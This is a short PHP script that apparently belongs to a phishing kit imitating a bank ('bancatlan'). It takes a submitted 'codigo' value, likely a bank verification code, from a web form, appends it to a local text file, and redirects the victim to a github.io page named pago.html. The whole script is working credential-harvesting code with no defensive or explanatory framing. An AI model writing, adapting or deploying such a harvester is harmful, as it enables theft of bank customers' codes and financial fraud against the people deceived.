<?php
$codigo = $_POST['codigo'];


$fecha = date("d/m/y g:i:s");
$file = fopen ('codigo.txt', 'at');
fwrite($file, "codigo: $codigo  \n");
fclose($file);
header("location:https://bancatlan.github.io/Hilux/pago.html");

?>
